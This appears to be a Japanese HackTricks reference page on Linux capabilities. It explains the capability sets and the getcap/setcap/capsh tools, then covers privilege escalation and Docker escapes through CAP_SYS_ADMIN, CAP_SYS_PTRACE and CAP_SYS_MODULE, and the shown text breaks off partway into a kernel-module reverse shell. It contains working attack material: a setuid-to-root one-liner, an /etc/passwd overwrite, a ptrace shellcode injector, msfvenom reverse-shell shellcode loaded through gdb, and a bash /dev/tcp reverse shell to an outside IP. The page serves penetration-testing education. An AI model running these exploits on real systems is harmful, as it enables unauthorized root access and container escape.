# Linux Capabilities

<details>

<summary><strong>ゼロからヒーローまでAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

HackTricks をサポートする他の方法:

* **HackTricks で企業を宣伝したい** または **HackTricks をPDFでダウンロードしたい** 場合は [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) をチェックしてください！
* [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な [**NFTs**](https://opensea.io/collection/the-peass-family) のコレクションを見つける
* **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)** に参加するか、[telegramグループ](https://t.me/peass) に参加するか、**Twitter** 🐦 で **@carlospolopm** をフォローする
* **ハッキングテクニックを共有するには** [**HackTricks**](https://github.com/carlospolop/hacktricks) と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) のGitHubリポジトリにPRを提出してください。

</details>

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) は **スペイン** で最も関連性の高いサイバーセキュリティイベントであり、**ヨーロッパ** でも最も重要なイベントの1つです。**技術知識の促進を使命とする** この会議は、あらゆる分野のテクノロジーとサイバーセキュリティ専門家にとっての沸点の集まりです。\\

{% embed url="https://www.rootedcon.com/" %}

## Linux Capabilities

Linuxの機能は **root権限をより小さな独立した単位に分割** し、プロセスが特定の権限のサブセットを持つことを可能にします。これにより、必要のない完全なroot権限を与えることなく、リスクを最小限に抑えます。

### 問題点:
- 通常のユーザーは制限された権限しか持たず、rootアクセスが必要なネットワークソケットの開設などのタスクに影響を与えます。

### 機能セット:

1. **Inherited (CapInh)**:
- **目的**: 親プロセスから受け継がれる機能を決定します。
- **機能**: 新しいプロセスが作成されると、このセット内の親から機能を受け継ぎます。プロセスの生成ごとに特定の権限を維持するのに役立ちます。
- **制限**: プロセスは、親が持っていない機能を取得することはできません。

2. **Effective (CapEff)**:
- **目的**: プロセスがいつでも利用している実際の機能を表します。
- **機能**: カーネルが様々な操作の許可を与えるためにチェックする機能のセットです。ファイルに対しては、ファイルの許可された機能が有効かどうかを示すフラグになります。
- **重要性**: すぐに権限をチェックするために必要な有効なセットであり、プロセスが使用できるアクティブな機能のセットとして機能します。

3. **Permitted (CapPrm)**:
- **目的**: プロセスが持つことができる最大の機能セットを定義します。
- **機能**: プロセスは、許可されたセットから機能を有効なセットに昇格させることができ、その機能を使用する能力を持つことができます。また、許可されたセットから機能を削除することもできます。
- **境界**: プロセスが持つことができる機能の上限として機能し、プロセスが事前に定義された特権範囲を超えないようにします。

4. **Bounding (CapBnd)**:
- **目的**: プロセスがライフサイクル中に取得できる機能の上限を設定します。
- **機能**: プロセスが継承可能または許可されたセットに特定の機能を持っていても、バウンディングセットにも含まれていない限り、その機能を取得することはできません。
- **ユースケース**: このセットは、プロセスの特権昇格の可能性を制限するために特に役立ち、セキュリティの追加のレイヤーを追加します。

5. **Ambient (CapAmb)**:
- **目的**: 通常はプロセスの機能を完全にリセットする `execve` システムコールを介して、特定の機能を維持することを可能にします。
- **機能**: 関連付けられたファイル機能を持たない非SUIDプログラムが特定の権限を保持できるようにします。
- **制限**: このセット内の機能は、継承可能および許可されたセットの制約に従い、プロセスの許可された特権を超えないようにします。
```python
# Code to demonstrate the interaction of different capability sets might look like this:
# Note: This is pseudo-code for illustrative purposes only.
def manage_capabilities(process):
if process.has_capability('cap_setpcap'):
process.add_capability_to_set('CapPrm', 'new_capability')
process.limit_capabilities('CapBnd')
process.preserve_capabilities_across_execve('CapAmb')
```
## プロセス＆バイナリの権限

### プロセスの権限

特定のプロセスの権限を確認するには、/procディレクトリ内の**status**ファイルを使用します。より詳細な情報を提供するため、Linuxの権限に関連する情報に限定します。\
すべての実行中のプロセスについて、権限情報はスレッドごとに管理され、ファイルシステム内のバイナリには拡張属性として格納されています。

権限は/usr/include/linux/capability.hに定義されています。

現在のプロセスの権限は`cat /proc/self/status`または`capsh --print`で、他のユーザーの権限は`/proc/<pid>/status`で確認できます。
```bash
cat /proc/1234/status | grep Cap
cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
```
このコマンドは、ほとんどのシステムで5行を返すはずです。

* CapInh = 継承された機能
* CapPrm = 許可された機能
* CapEff = 有効な機能
* CapBnd = 境界セット
* CapAmb = アンビエント機能セット
```bash
#These are the typical capabilities of a root owned process (all)
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
```
これらの16進数は意味がありません。capshユーティリティを使用して、これらを機能名にデコードできます。
```bash
capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
```
さて、`ping` が使用する **capabilities** を確認しましょう：
```bash
cat /proc/9491/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000000000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
その方法は機能しますが、別の簡単な方法もあります。実行中のプロセスの機能を確認するには、単純に**getpcaps**ツールを使用し、その後にプロセスID（PID）を指定します。プロセスIDのリストを指定することもできます。
```bash
getpcaps 1234
```
以下は、プロセス9562で実行されているtcpdumpの機能を確認するために、バイナリに十分な権限（`cap_net_admin`および`cap_net_raw`）を与えた後のものです：
```bash
#The following command give tcpdump the needed capabilities to sniff traffic
$ setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump

$ getpcaps 9562
Capabilities for `9562': = cap_net_admin,cap_net_raw+ep

$ cat /proc/9562/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000003000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

$ capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
如何わかるように、与えられた機能は、バイナリの機能を取得する2つの方法の結果に対応しています。  
_getpcaps_ ツールは、特定のスレッドの利用可能な機能を問い合わせるために **capget()** システムコールを使用します。このシステムコールでは、より詳細な情報を取得するために PID のみを提供する必要があります。

### バイナリの機能

バイナリには、実行中に使用できる機能があります。たとえば、`ping` バイナリには `cap_net_raw` 機能が非常に一般的です。
```bash
getcap /usr/bin/ping
/usr/bin/ping = cap_net_raw+ep
```
あなたは次のようにして**権限を持つバイナリを検索**できます：
```bash
getcap -r / 2>/dev/null
```
### capshを使用して機能を削除する

CAP\_NET\_RAW機能を_ping_から削除すると、pingユーティリティはもはや機能しなくなります。
```bash
capsh --drop=cap_net_raw --print -- -c "tcpdump"
```
### 機能を削除する

バイナリの機能を削除することができます。
```bash
setcap -r </path/to/binary>
```
## ユーザーの権限

明らかに**ユーザーにも権限を割り当てることが可能**です。おそらく、ユーザーが実行するすべてのプロセスがユーザーの権限を使用できることを意味します。\
[これ](https://unix.stackexchange.com/questions/454708/how-do-you-add-cap-sys-admin-permissions-to-user-in-centos-7)、[これ](http://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html)、および[これ](https://stackoverflow.com/questions/1956732-is-it-possible-to-configure-linux-capabilities-per-user)に基づいて、特定の権限をユーザーに付与するためにいくつかのファイルを設定する必要がありますが、各ユーザーに権限を割り当てるのは`/etc/security/capability.conf`になります。\
ファイルの例：
```bash
# Simple
cap_sys_ptrace               developer
cap_net_raw                  user1

# Multiple capablities
cap_net_admin,cap_net_raw    jrnetadmin
# Identical, but with numeric values
12,13                        jrnetadmin

# Combining names and numerics
cap_sys_admin,22,25          jrsysadmin
```
## 環境キャパビリティ

以下のプログラムをコンパイルすると、**キャパビリティを提供する環境内でbashシェルを生成することが可能**です。

{% code title="ambient.c" %}
```c
/*
* Test program for the ambient capabilities
*
* compile using:
* gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
* Set effective, inherited and permitted capabilities to the compiled binary
* sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
*
* To get a shell with additional caps that can be inherited do:
*
* ./ambient /bin/bash
*/

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sys/prctl.h>
#include <linux/capability.h>
#include <cap-ng.h>

static void set_ambient_cap(int cap) {
int rc;
capng_get_caps_process();
rc = capng_update(CAPNG_ADD, CAPNG_INHERITABLE, cap);
if (rc) {
printf("Cannot add inheritable cap\n");
exit(2);
}
capng_apply(CAPNG_SELECT_CAPS);
/* Note the two 0s at the end. Kernel checks for these */
if (prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, cap, 0, 0)) {
perror("Cannot set cap");
exit(1);
}
}
void usage(const char * me) {
printf("Usage: %s [-c caps] new-program new-args\n", me);
exit(1);
}
int default_caplist[] = {
CAP_NET_RAW,
CAP_NET_ADMIN,
CAP_SYS_NICE,
-1
};
int * get_caplist(const char * arg) {
int i = 1;
int * list = NULL;
char * dup = strdup(arg), * tok;
for (tok = strtok(dup, ","); tok; tok = strtok(NULL, ",")) {
list = realloc(list, (i + 1) * sizeof(int));
if (!list) {
perror("out of memory");
exit(1);
}
list[i - 1] = atoi(tok);
list[i] = -1;
i++;
}
return list;
}
int main(int argc, char ** argv) {
int rc, i, gotcaps = 0;
int * caplist = NULL;
int index = 1; // argv index for cmd to start
if (argc < 2)
usage(argv[0]);
if (strcmp(argv[1], "-c") == 0) {
if (argc <= 3) {
usage(argv[0]);
}
caplist = get_caplist(argv[2]);
index = 3;
}
if (!caplist) {
caplist = (int * ) default_caplist;
}
for (i = 0; caplist[i] != -1; i++) {
printf("adding %d to ambient list\n", caplist[i]);
set_ambient_cap(caplist[i]);
}
printf("Ambient forking shell\n");
if (execv(argv[index], argv + index))
perror("Cannot exec");
return 0;
}
```
{% endcode %}
```bash
gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
./ambient /bin/bash
```
**コンパイルされた環境バイナリによって実行されるbash**内で、**新しい機能**を観察することができます（通常のユーザーは「current」セクションに機能を持ちません）。
```bash
capsh --print
Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
```
{% hint style="danger" %}
許可されたセットと継承可能なセットの両方に存在する機能のみを追加できます。
{% endhint %}

### 機能認識/機能非認識バイナリ

**機能認識バイナリ**は環境から与えられた新しい機能を使用しませんが、**機能非認識バイナリ**はそれらを拒否しないため使用します。これにより、機能非認識バイナリは特定の環境内で機能をバイパスされる可能性があります。

## サービス機能

デフォルトでは、**rootとして実行されるサービスにはすべての機能が割り当てられます**が、これは危険な場合があります。\
したがって、**サービス構成**ファイルを使用して、サービスに割り当てる**機能**と、サービスを実行する**ユーザー**を指定し、不必要な特権でサービスを実行しないようにします。
```bash
[Service]
User=bob
AmbientCapabilities=CAP_NET_BIND_SERVICE
```
## Dockerコンテナー内の権限

デフォルトでは、Dockerはコンテナーにいくつかの権限を割り当てます。これらがどの権限であるかを確認するには、次のコマンドを実行するだけです：
```bash
docker run --rm -it  r.j3ss.co/amicontained bash
Capabilities:
BOUNDING -> chown dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot mknod audit_write setfcap

# Add a capabilities
docker run --rm -it --cap-add=SYS_ADMIN r.j3ss.co/amicontained bash

# Add all capabilities
docker run --rm -it --cap-add=ALL r.j3ss.co/amicontained bash

# Remove all and add only one
docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained bash
```
<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/)は**スペイン**で最も関連性の高いサイバーセキュリティイベントであり、**ヨーロッパ**でも最も重要なイベントの一つです。**技術知識の促進を使命**とするこの会議は、あらゆる分野のテクノロジーとサイバーセキュリティ専門家にとって熱い出会いの場です。

{% embed url="https://www.rootedcon.com/" %}

## Privesc/Container Escape

Capabilitiesは、特権操作を実行した後に自分自身のプロセスを制限したい場合に便利です（例：chrootの設定やソケットへのバインド後）。ただし、これらは悪意のあるコマンドや引数を渡すことで悪用され、その後rootとして実行される可能性があります。

`setcap`を使用してプログラムにCapabilitiesを強制し、`getcap`を使用してこれらをクエリできます。
```bash
#Set Capability
setcap cap_net_raw+ep /sbin/ping

#Get Capability
getcap /sbin/ping
/sbin/ping = cap_net_raw+ep
```
`+ep` は、機能を追加していることを示します（“-” はそれを削除します）有効および許可されたものとして。

システムまたはフォルダ内のプログラムを機能で特定するには：
```bash
getcap -r / 2>/dev/null
```
### 悪用例

次の例では、バイナリ `/usr/bin/python2.6` が特権昇格に脆弱であることがわかりました。
```bash
setcap cap_setuid+ep /usr/bin/python2.7
/usr/bin/python2.7 = cap_setuid+ep

#Exploit
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```
**`tcpdump`がパケットをスニッフするために必要な** **Capabilities**:

- `CAP_NET_RAW`
- `CAP_NET_ADMIN`
```bash
setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
getcap /usr/sbin/tcpdump
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
```
### "空の"権限の特別なケース

[ドキュメントから](https://man7.org/linux/man-pages/man7/capabilities.7.html): 1つのプログラムファイルに空の権限セットを割り当てることができるため、実行されるプロセスの有効および保存されたユーザーIDを0に変更するset-user-ID-rootプログラムを作成することが可能ですが、そのプロセスに権限を付与しないことも可能です。つまり、次の条件を満たすバイナリがある場合：

1. root所有ではない
2. `SUID`/`SGID` ビットが設定されていない
3. 空の権限セットを持つ（例：`getcap myelf` が `myelf =ep` を返す）

そのバイナリは**rootとして実行**されます。

## CAP\_SYS\_ADMIN

**[`CAP_SYS_ADMIN`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** は非常に強力なLinux機能であり、デバイスのマウントやカーネル機能の操作など、広範な**管理特権**を持つため、ほぼrootレベルと同等とされます。コンテナが完全なシステムをシミュレートする際に不可欠ですが、**`CAP_SYS_ADMIN` は特権昇格やシステムの侵害の可能性があるため、コンテナ化された環境では重要なセキュリティ上の課題**を抱えています。そのため、この機能をアプリケーション固有のコンテナから削除して、**最小特権の原則**に従い攻撃面を最小限に抑えることが強く推奨されます。

**バイナリの例**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_admin+ep
```
Pythonを使用して、実際の_passwd_ファイルの上に修正された_passwd_ファイルをマウントすることができます：
```bash
cp /etc/passwd ./ #Create a copy of the passwd file
openssl passwd -1 -salt abc password #Get hash of "password"
vim ./passwd #Change roots passwords of the fake passwd file
```
最後に、`passwd` ファイルを修正して `/etc/passwd` に**マウント**します：
```python
from ctypes import *
libc = CDLL("libc.so.6")
libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)
MS_BIND = 4096
source = b"/path/to/fake/passwd"
target = b"/etc/passwd"
filesystemtype = b"none"
options = b"rw"
mountflags = MS_BIND
libc.mount(source, target, filesystemtype, mountflags, options)
```
そして、パスワード"password"を使用して、**`su`をrootとして実行**することができます。

**環境を使用した例（Docker脱出）**

Dockerコンテナ内で有効な機能を確認することができます。
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
前の出力の中で、SYS_ADMIN 機能が有効になっていることがわかります。

* **マウント**

これにより、docker コンテナはホストディスクをマウントして自由にアクセスできます。
```bash
fdisk -l #Get disk name
Disk /dev/sda: 4 GiB, 4294967296 bytes, 8388608 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes

mount /dev/sda /mnt/ #Mount it
cd /mnt
chroot ./ bash #You have a shell inside the docker hosts disk
```
* **完全なアクセス**

前の方法では、Dockerホストディスクにアクセスできました。\
ホストが**ssh**サーバーを実行していることがわかった場合、Dockerホストディスク内にユーザーを**作成**してSSH経由でアクセスできます：
```bash
#Like in the example before, the first step is to mount the docker host disk
fdisk -l
mount /dev/sda /mnt/

#Then, search for open ports inside the docker host
nc -v -n -w2 -z 172.17.0.1 1-65535
(UNKNOWN) [172.17.0.1] 2222 (?) open

#Finally, create a new user inside the docker host and use it to access via SSH
chroot /mnt/ adduser john
ssh john@172.17.0.1 -p 2222
```
## CAP\_SYS\_PTRACE

**これは、ホスト内で実行されているプロセスにシェルコードをインジェクトすることで、コンテナから脱出できることを意味します。** ホスト内で実行されているプロセスにアクセスするには、コンテナを少なくとも**`--pid=host`**オプションで実行する必要があります。

**[`CAP_SYS_PTRACE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** は、`ptrace(2)`によって提供されるデバッグおよびシステムコールトレース機能、`process_vm_readv(2)`や`process_vm_writev(2)`などのクロスメモリアタッチ呼び出しを使用する権限を付与します。診断および監視の目的には強力ですが、`CAP_SYS_PTRACE`が`ptrace(2)`に対するセコンプフィルタなどの制限措置なしに有効になっていると、システムのセキュリティが著しく損なわれる可能性があります。具体的には、他のセキュリティ制限を回避するために悪用される可能性があり、特に、[このような PoC（プルーフオブコンセプト）によって示されるように](https://gist.github.com/thejh/8346f47e359adecd1d53)、セコンプによって課せられる制限を回避することができます。

**バイナリ（python）の例**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_ptrace+ep
```

```python
import ctypes
import sys
import struct
# Macros defined in <sys/ptrace.h>
# https://code.woboq.org/qt5/include/sys/ptrace.h.html
PTRACE_POKETEXT = 4
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_ATTACH = 16
PTRACE_DETACH = 17
# Structure defined in <sys/user.h>
# https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct
class user_regs_struct(ctypes.Structure):
_fields_ = [
("r15", ctypes.c_ulonglong),
("r14", ctypes.c_ulonglong),
("r13", ctypes.c_ulonglong),
("r12", ctypes.c_ulonglong),
("rbp", ctypes.c_ulonglong),
("rbx", ctypes.c_ulonglong),
("r11", ctypes.c_ulonglong),
("r10", ctypes.c_ulonglong),
("r9", ctypes.c_ulonglong),
("r8", ctypes.c_ulonglong),
("rax", ctypes.c_ulonglong),
("rcx", ctypes.c_ulonglong),
("rdx", ctypes.c_ulonglong),
("rsi", ctypes.c_ulonglong),
("rdi", ctypes.c_ulonglong),
("orig_rax", ctypes.c_ulonglong),
("rip", ctypes.c_ulonglong),
("cs", ctypes.c_ulonglong),
("eflags", ctypes.c_ulonglong),
("rsp", ctypes.c_ulonglong),
("ss", ctypes.c_ulonglong),
("fs_base", ctypes.c_ulonglong),
("gs_base", ctypes.c_ulonglong),
("ds", ctypes.c_ulonglong),
("es", ctypes.c_ulonglong),
("fs", ctypes.c_ulonglong),
("gs", ctypes.c_ulonglong),
]

libc = ctypes.CDLL("libc.so.6")

pid=int(sys.argv[1])

# Define argument type and respone type.
libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_uint64

# Attach to the process
libc.ptrace(PTRACE_ATTACH, pid, None, None)
registers=user_regs_struct()

# Retrieve the value stored in registers
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
print("Instruction Pointer: " + hex(registers.rip))
print("Injecting Shellcode at: " + hex(registers.rip))

# Shell code copied from exploit db. https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c
shellcode = "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"

# Inject the shellcode into the running process byte by byte.
for i in xrange(0,len(shellcode),4):
# Convert the byte to little endian.
shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
shellcode_byte=int(shellcode_byte_little_endian,16)

# Inject the byte.
libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)

print("Shellcode Injected!!")

# Modify the instuction pointer
registers.rip=registers.rip+2

# Set the registers
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
print("Final Instruction Pointer: " + hex(registers.rip))

# Detach from the process.
libc.ptrace(PTRACE_DETACH, pid, None, None)
```
**バイナリを使用した例（gdb）**

`ptrace` 機能を持つ `gdb`:
```
/usr/bin/gdb = cap_sys_ptrace+ep
```
msfvenomを使用して、gdbを介してメモリにインジェクトするためのシェルコードを作成します。
```python
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
buf += b"\x48\x97\x48\xb9\x02\x00\x23\x29\x0a\x0a\x0e\x0b"
buf += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
buf += b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
buf += b"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
buf += b"\x0f\x05"

# Divisible by 8
payload = b"\x90" * (8 - len(buf) % 8 ) + buf

# Change endianess and print gdb lines to load the shellcode in RIP directly
for i in range(0, len(buf), 8):
chunk = payload[i:i+8][::-1]
chunks = "0x"
for byte in chunk:
chunks += f"{byte:02x}"

print(f"set {{long}}($rip+{i}) = {chunks}")
```
ルートプロセスをgdbでデバッグし、以前に生成されたgdbの行をコピーして貼り付けます：
```bash
# In this case there was a sleep run by root
## NOTE that the process you abuse will die after the shellcode
/usr/bin/gdb -p $(pgrep sleep)
[...]
(gdb) set {long}($rip+0) = 0x296a909090909090
(gdb) set {long}($rip+8) = 0x5e016a5f026a9958
(gdb) set {long}($rip+16) = 0x0002b9489748050f
(gdb) set {long}($rip+24) = 0x48510b0e0a0a2923
(gdb) set {long}($rip+32) = 0x582a6a5a106ae689
(gdb) set {long}($rip+40) = 0xceff485e036a050f
(gdb) set {long}($rip+48) = 0x6af675050f58216a
(gdb) set {long}($rip+56) = 0x69622fbb4899583b
(gdb) set {long}($rip+64) = 0x8948530068732f6e
(gdb) set {long}($rip+72) = 0x050fe689485752e7
(gdb) c
Continuing.
process 207009 is executing new program: /usr/bin/dash
[...]
```
**環境を利用した例（Docker脱出）- 別のGDBの悪用**

もし**GDB**がインストールされている場合（または`apk add gdb`や`apt install gdb`などでインストールできる場合があります）、**ホストからプロセスをデバッグ**し、`system`関数を呼び出すことができます（このテクニックには`SYS_ADMIN`権限も必要です）。
```bash
gdb -p 1234
(gdb) call (void)system("ls")
(gdb) call (void)system("sleep 5")
(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/192.168.115.135/5656 0>&1'")
```
コマンドの出力は見ることができませんが、そのプロセスで実行されます（つまり、逆シェルを取得します）。

{% hint style="warning" %}
エラー "No symbol "system" in current context." が表示された場合は、gdbを使用してプログラムにシェルコードをロードする前の例を確認してください。
{% endhint %}

**環境を使用した例（Docker脱出）- シェルコードインジェクション**

Dockerコンテナ内で有効な機能を確認することができます。
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root
```
## CAP_SYS_MODULE

[`CAP_SYS_MODULE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)は、**カーネルモジュールのロードとアンロード（`init_module(2)`、`finit_module(2)`および`delete_module(2)`システムコール）**を行うプロセスに権限を与え、カーネルのコア操作に直接アクセスできるようにします。この機能には重大なセキュリティリスクがあり、特権昇格やカーネルの変更を許可するため、Linuxセキュリティメカニズム全体（Linuxセキュリティモジュールやコンテナの分離を含む）をバイパスしてしまうため、システム全体が危険にさらされます。
**これは、ホストマシンのカーネルにカーネルモジュールを挿入/削除できることを意味します。**

**バイナリを使用した例**

以下の例では、バイナリ**`python`**がこの機能を持っています。
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_module+ep
```
デフォルトでは、**`modprobe`**コマンドは依存リストとマップファイルをディレクトリ**`/lib/modules/$(uname -r)`**でチェックします。\
これを悪用するために、偽の**lib/modules**フォルダを作成しましょう：
```bash
mkdir lib/modules -p
cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
```
次に、以下に2つの例があるカーネルモジュールを**コンパイル**し、このフォルダにコピーしてください：
```bash
cp reverse-shell.ko lib/modules/$(uname -r)/
```
最後に、必要なPythonコードを実行して、このカーネルモジュールをロードします：
```python
import kmod
km = kmod.Kmod()
km.set_mod_dir("/path/to/fake/lib/modules/5.0.0-20-generic/")
km.modprobe("reverse-shell")
```
**バイナリを使用した例2**

次の例では、バイナリ **`kmod`** にこの機能があります。
```bash
getcap -r / 2>/dev/null
/bin/kmod = cap_sys_module+ep
```
## Linux Capabilities

これは、**`insmod`** コマンドを使用してカーネルモジュールを挿入することが可能であることを意味します。この特権を悪用して **reverse shell** を取得するための以下の例に従ってください。

**環境を使用した例 (Docker breakout)**

Dockerコンテナ内で有効な機能を確認するには、次のコマンドを使用します：
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
前の出力の中で、**SYS\_MODULE** 機能が有効になっていることがわかります。

**リバースシェルを実行する** カーネルモジュールを **作成** し、それを **コンパイル** するための **Makefile** を **作成** します：

{% code title="reverse-shell.c" %}
```c
#include <linux/kmod.h>
#include <linux/module.h>
